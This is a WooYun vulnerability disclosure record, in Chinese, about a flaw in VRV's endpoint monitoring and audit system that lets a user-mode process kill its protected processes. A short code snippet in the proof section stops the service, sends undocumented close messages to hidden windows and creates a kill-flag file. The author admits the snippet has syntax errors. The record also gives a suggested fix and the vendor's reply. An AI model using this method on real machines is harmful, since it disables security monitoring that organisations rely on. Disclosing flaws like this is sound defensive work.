{"id": 3873, "wybug_id": "wooyun-2014-052678", "wybug_title": "北信源监控审计系统进程保护设计缺陷，用户态可杀", "wybug_corp": "北京北信源软件股份有限公司", "wybug_author": "Bin.Y", "wybug_date": "2014-03-03 20:30", "wybug_open_date": "2014-06-01 20:31", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["你们看了我的简历但是没有联系我"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向公众公开  简要描述： 北信源监控审计系统进程保护设计缺陷，用户态可杀本来是自己留给卸载程序的关闭后门，但是对调用方没有验证，所以就完蛋啦！后台还是有办法知道进程被关了，危害下降进程关闭后，禁用光驱等功能完全失效，危害上升 详细说明：  本来是自己留给卸载程序的关闭后门，但是对调用方没有验证，所以就完蛋啦！北信源有4个进程，Watch开头的用net stop VRVWatchServer就搞定了剩下三个vrv开头的进程，都有各自不可见的窗口，发送两个消息就可以关。三个vrv开头的进程中，有一个进程以一个文件作为进程终止标志，文件被创建则进程自行退出，同时，自我保护又没有限制这个文件的创建者，然后就可以乱搞了……   漏洞证明：  代码部分逆向得卸载程序，写得很糙，凑合看吧…… \nsystem(\"net stop VRVWatchServer\")HWND hEdpPolicyWnd = FindWindowW(0,\"EDP-POLICY\");HWND hEdpProtectedWnd = FindWindowW(0,\"EDP_PROTECTED\");HWND hEdpMainWnd = FindWindowW(0,\"EDP_MAIN\");PostMessageW(hEdpPolicyWnd,0xA40,1,0);PostMessageW(hEdpProtectedWnd,0xA40,1,0);PostMessageW(hEdpMainWnd,0xA40,1,0);PostMessageW(hEdpPolicyWnd,WM_CLOSE,0,0);PostMessageW(hEdpProtectedWnd,WM_CLOSE,0,0);PostMessageW(hEdpMainWnd,WM_CLOSE,0,0);CreateFileW(L\"C:\\\\windows\\\\system32\\\\exitvrv.flg\",GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,0,CREATE_ALWAYS,0,NULL);\n   修复方案：  验证消息发送方是否为卸载程序，保护服务不被关闭。一些调试用的标志不要在Release版里存在。完善保护，用户态还有别的办法可以搞。   版权声明：转载请注明来源 Bin.Y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-03-08 11:33 厂商回复： CNVD确认所述情况，已经由CNVD直接联系上北信源公司（通过其高层），向其通报漏洞情况。根据北信源公司反馈，漏洞仅存在于较低版本，新版本已经无漏洞情况，请相关用户做好升级工作。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 23:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，这个很有意思    \n     2014-03-03 23:20 |    \t\tBin.Y \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:4        | 为了跳槽……)\t\t \n  又看了一遍，发现代码有些语法错误……单位里完成的东西带不出来，我就记下了几个关键点回家重新完成的代码，也没编译就贴过来了（家里没有测试环境），看来以后还是要严谨一点的好嘛不过意思到了……    \n     2014-03-03 23:56 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  可以在单位写好吗。那么多大牛都是在“单位”搞，给力。    \n     2014-03-05 15:28 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  这个可以有。。上一次去某单位做测试整这个东西整半天    \n     2014-03-08 18:02 |    \t\tBin.Y \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:4        | 为了跳槽……)\t\t \n  我尝试编辑过一次内容中有误的部分，但是似乎一直没有审核成功……这次提交漏洞我收获的教训是：1.发出来之前要读几遍确认正确无误；2.以后发这种软件要带上版本号一起发应该就不会说是旧版了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}